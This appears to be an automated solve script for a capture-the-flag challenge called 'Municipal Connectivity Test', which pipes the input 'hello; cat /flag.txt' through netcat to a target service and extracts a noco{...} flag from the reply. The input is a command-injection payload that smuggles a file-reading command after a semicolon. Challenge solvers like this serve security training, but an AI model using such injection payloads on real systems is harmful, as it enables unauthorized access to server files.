#!/usr/bin/env bash
# Municipal Connectivity Test - automated solve. $TARGET is "host port".
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30001}"

flag=$(printf 'hello; cat /flag.txt\n' \
        | nc -w 5 "$host" "$port" \
        | grep -oE 'noco\{[^}]+\}' \
        | head -1)

[[ -n "$flag" ]] || { echo "solve: no flag from $host:$port" >&2; exit 1; }
echo "$flag"
